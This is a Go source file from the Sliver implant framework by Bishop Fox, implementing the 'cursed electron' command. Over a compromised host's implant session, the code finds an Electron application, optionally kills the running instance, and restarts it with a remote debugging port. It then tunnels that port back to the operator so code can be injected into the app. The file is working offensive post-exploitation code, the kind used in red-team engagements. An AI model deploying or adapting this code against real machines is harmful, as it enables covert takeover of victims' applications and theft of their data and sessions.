package cursed

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"log"
	insecureRand "math/rand"
	"path"
	"time"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/overlord"
	"github.com/bishopfox/sliver/client/tcpproxy"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
)

func CursedElectronCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	electronExe, _ := cmd.Flags().GetString("exe")
	if electronExe == "" {
		con.PrintErrorf("Missing --exe flag, see --help\n")
		return
	}

	curse := avadaKedavraElectron(electronExe, session, cmd, con, args)
	if curse == nil {
		return
	}
	con.PrintInfof("Checking for debug targets ...")
	targets, err := overlord.QueryDebugTargets(curse.DebugURL().String())
	con.Printf(console.Clearln + "\r")
	if err != nil {
		con.PrintErrorf("Failed to query debug targets: %s\n", err)
		return
	}
	if len(targets) == 0 {
		con.PrintErrorf("Zero debug targets found\n")
		return
	}
	con.PrintInfof("Found %d debug targets, good hunting!\n", len(targets))
}

func avadaKedavraElectron(electronExe string, session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient, cargs []string) *core.CursedProcess {
	exists, err := checkElectronPath(electronExe, session, cmd, con)
	if err != nil {
		con.PrintErrorf("%s", err)
		return nil
	}
	if !exists {
		con.PrintErrorf("Executable path does not exist: %s", electronExe)
		return nil
	}
	electronProcess, err := checkElectronProcess(electronExe, session, cmd, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	if electronProcess != nil {
		con.PrintWarnf("Found running '%s' process: %d (ppid: %d)\n", path.Base(electronExe), electronProcess.GetPid(), electronProcess.GetPpid())
		con.PrintWarnf("Sliver will need to kill and restart the process in order to perform code injection.\n")
		con.PrintWarnf("%sDATA LOSS MAY OCCUR!%s\n", console.Bold, console.Normal)
		con.Printf("\n")
		confirm := false
		err = survey.AskOne(&survey.Confirm{Message: "Kill and restart the process?"}, &confirm)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return nil
		}
		if !confirm {
			con.PrintErrorf("User cancel\n")
			return nil
		}
		terminateResp, err := con.Rpc.Terminate(context.Background(), &sliverpb.TerminateReq{
			Request: con.ActiveTarget.Request(cmd),
			Pid:     electronProcess.Pid,
		})
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return nil
		}
		if terminateResp.Response != nil && terminateResp.Response.Err != "" {
			con.PrintErrorf("could not terminate the existing process: %s\n", terminateResp.Response.Err)
			return nil
		}
	}
	curse, err := startCursedElectronProcess(electronExe, session, cmd, con, cargs)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	return curse
}

func checkElectronPath(electronExe string, session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient) (bool, error) {
	ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    electronExe,
	})
	if err != nil {
		return false, err
	}
	return ls.GetExists(), nil
}

func checkElectronProcess(electronExe string, session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient) (*commonpb.Process, error) {
	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: con.ActiveTarget.Request(cmd),
	})
	if err != nil {
		return nil, err
	}
	for _, process := range ps.Processes {
		if process.GetOwner() != session.GetUsername() {
			continue
		}
		if process.GetExecutable() == electronExe || path.Base(process.GetExecutable()) == path.Base(electronExe) {
			return process, nil
		}
	}
	return nil, nil
}

func startCursedElectronProcess(electronExe string, session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient, cargs []string) (*core.CursedProcess, error) {
	con.PrintInfof("Starting '%s' ... ", path.Base(electronExe))
	debugPort := getRemoteDebuggerPort(cmd)
	args := []string{
		fmt.Sprintf("--remote-debugging-port=%d", debugPort),
	}

	if len(cargs) > 0 {
		args = append(args, cargs...)
	}

	// Execute the Chrome process with the extra flags
	// TODO: PPID spoofing, etc.
	electronExec, err := con.Rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    electronExe,
		Args:    args,
		Output:  false,
	})
	if err != nil {
		con.Printf("failure!\n")
		return nil, err
	}
	con.Printf("(pid: %d) success!\n", electronExec.GetPid())

	con.PrintInfof("Waiting for process to initialize ... ")
	time.Sleep(2 * time.Second)

	bindPort := insecureRand.Intn(10000) + 40000
	bindAddr := fmt.Sprintf("127.0.0.1:%d", bindPort)

	remoteAddr := fmt.Sprintf("127.0.0.1:%d", debugPort)

	tcpProxy := &tcpproxy.Proxy{}
	channelProxy := &core.ChannelProxy{
		Rpc:             con.Rpc,
		Session:         session,
		RemoteAddr:      remoteAddr,
		BindAddr:        bindAddr,
		KeepAlivePeriod: 60 * time.Second,
		DialTimeout:     30 * time.Second,
	}
	tcpProxy.AddRoute(bindAddr, channelProxy)
	portFwd := core.Portfwds.Add(tcpProxy, channelProxy)

	curse := &core.CursedProcess{
		SessionID:   session.ID,
		PID:         electronExec.GetPid(),
		PortFwd:     portFwd,
		BindTCPPort: bindPort,
		Platform:    session.GetOS(),
		ExePath:     electronExe,
	}
	core.CursedProcesses.Store(bindPort, curse)
	go func() {
		err := tcpProxy.Run()
		if err != nil {
			log.Printf("Proxy error %s", err)
		}
		core.CursedProcesses.Delete(bindPort)
	}()

	con.PrintInfof("Port forwarding %s -> %s\n", bindAddr, remoteAddr)

	return curse, nil
}
